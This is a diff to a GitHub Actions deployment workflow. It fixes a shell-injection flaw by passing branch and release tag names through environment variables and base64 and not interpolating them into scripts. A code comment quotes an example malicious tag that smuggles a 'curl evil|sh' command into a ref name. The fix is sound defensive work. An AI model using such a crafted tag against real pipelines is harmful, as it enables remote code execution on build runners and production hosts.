@@ -303,10 +303,13 @@ jobs:
           exit 1
 
       - name: Deployment summary
+        env:
+          # Branch names carry the same metacharacter risk as tags (#933).
+          BRANCH_NAME: ${{ github.ref_name }}
         run: |
           echo "## Staging Deployment Summary" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
-          echo "- **Branch**: ${{ github.ref_name }}" >> $GITHUB_STEP_SUMMARY
+          echo "- **Branch**: $BRANCH_NAME" >> $GITHUB_STEP_SUMMARY
           echo "- **Commit**: \`${{ github.sha }}\`" >> $GITHUB_STEP_SUMMARY
           echo "- **Deployed by**: ${{ github.actor }}" >> $GITHUB_STEP_SUMMARY
           echo "- **Time**: $(date -u '+%Y-%m-%d %H:%M:%S UTC')" >> $GITHUB_STEP_SUMMARY
@@ -560,7 +563,26 @@ jobs:
           FRONTEND_NAME_PROD: ${{ secrets.PM2_FRONTEND_NAME }}
           NEXT_PUBLIC_API_URL: ${{ secrets.API_URL }}
           NEXT_PUBLIC_WS_URL: ${{ secrets.WS_URL }}
+          # Via env, never `${{ }}` inside the run script: an expression is
+          # substituted as raw source text into the shell, an env var is data the
+          # shell never re-parses (#933).
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
         run: |
+          # The release tag is attacker-influenced: git ref names may legally
+          # contain ';', '$( )', backticks and pipes, and `${{ }}` is substituted
+          # by the runner BEFORE this heredoc is written. A tag like
+          #     v1.0.0";curl evil|sh;"
+          # therefore ran attacker shell on the runner and on the production
+          # host — repo write access escalating to production RCE (#933).
+          #
+          # base64 is the transport because its alphabet (A-Za-z0-9+/=) has no
+          # shell metacharacters, so the value survives both the runner-side
+          # heredoc expansion and the remote shell with nothing to escape. This
+          # mirrors the .env transfer above, which already does exactly this.
+          # ssh SendEnv is not used: it needs a matching AcceptEnv server-side,
+          # which this workflow does not control.
+          RELEASE_TAG_B64="$(printf '%s' "$RELEASE_TAG" | base64 | tr -d '\n')"
+
           ssh ${{ secrets.USER }}@${{ secrets.HOST }} "bash -s" << ENDSSH
             set -e
             echo "🚀 Starting deployment to production..."
@@ -571,9 +593,12 @@ jobs:
             # Pull the release tag or main
             echo "📥 Pulling latest code..."
             git fetch origin --tags
-            TAG_NAME="${{ github.event.release.tag_name }}"
+            TAG_NAME="\$(printf '%s' '${RELEASE_TAG_B64}' | base64 -d)"
             if [ -n "\$TAG_NAME" ]; then
-              git checkout \$TAG_NAME
+              # Quoted so a tag with whitespace or globs stays one argument.
+              # (git check-ref-format forbids a leading '-', so the ref cannot be
+              # mistaken for an option.)
+              git checkout "\$TAG_NAME"
               echo "✅ Checked out tag: \$TAG_NAME"
             else
               git fetch origin main
@@ -673,10 +698,15 @@ jobs:
           exit 1
 
       - name: Deployment summary
+        env:
+          # Same class as the deploy step (#933): interpolating a ref name into
+          # the run script executes `$( )` inside a tag on the runner. Not named
+          # in the issue, but the identical defect one step later.
+          RELEASE_VERSION: ${{ github.event.release.tag_name || github.ref_name }}
         run: |
           echo "## Production Deployment Summary" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
-          echo "- **Version**: ${{ github.event.release.tag_name || github.ref_name }}" >> $GITHUB_STEP_SUMMARY
+          echo "- **Version**: $RELEASE_VERSION" >> $GITHUB_STEP_SUMMARY
           echo "- **Commit**: \`${{ github.sha }}\`" >> $GITHUB_STEP_SUMMARY
           echo "- **Deployed by**: ${{ github.actor }}" >> $GITHUB_STEP_SUMMARY
           echo "- **Time**: $(date -u '+%Y-%m-%d %H:%M:%S UTC')" >> $GITHUB_STEP_SUMMARY
